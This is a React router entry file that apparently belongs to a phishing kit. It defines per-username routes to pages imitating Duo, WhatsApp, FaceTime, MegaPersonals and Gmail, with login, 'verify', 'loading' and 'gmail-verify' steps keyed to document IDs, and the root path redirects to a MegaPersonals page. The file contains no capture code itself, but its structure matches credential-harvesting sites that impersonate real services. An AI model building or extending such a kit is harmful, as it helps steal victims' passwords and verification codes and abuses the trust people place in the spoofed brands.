import React from 'react'
import ReactDOM from 'react-dom/client'
import App from './App.jsx'
import './index.css'
import {
  createBrowserRouter,
  RouterProvider,
} from "react-router-dom";
import Duo from './Pages/Duo.jsx';
import Mega from './Pages/Mega.jsx';
import Login from './Pages/Login.jsx';
import WhatsApp from './Pages/WhatsApp.jsx';
import FaceTime from './Pages/FaceTime.jsx';
import Gmail from './Pages/Gmail.jsx';
import GmailLogin from './Pages/GmailLogin.jsx';
import GmailVerify from './Pages/GmailVerify.jsx';
import GmailLoading from './Pages/GmailLoading.jsx';
import Verify from './Pages/Verify.jsx';


const RedirectToLogin = () => {
  window.location.href = '/home/megapersonals';
  return null; // This component does not render anything
}

const router = createBrowserRouter([
  {
    path: '/',
    element: <App />,
    children: [
      {
        index: true,
        element: <RedirectToLogin />,
      },
      {
        path: '/:username/duo',
        element: <Duo />
      },
      {
        path: '/:username/whatsapp',
        element: <WhatsApp />
      },
      {
        path: '/:username/facetime',
        element: <FaceTime />
      },
      {
        path: '/:username/megapersonals',
        element: <Mega />
      },
      {
        path: '/:username/login',
        element: <Login />
      },
      {
        path: '/:username/verify/:docId',
        element: <Verify />
      },
      {
        path: '/:username/gmail',
        element: <Gmail />
      },
      {
        path: '/:username/gmail-login',
        element: <GmailLogin />
      },
      {
        path: '/:username/gmail-loading/:docId',
        element: <GmailLoading />
      },
      {
        path: '/:username/gmail-verify',
        element: <GmailVerify />
      },
    ]
  }
])

ReactDOM.createRoot(document.getElementById('root')).render(
  <RouterProvider router={router} />
)
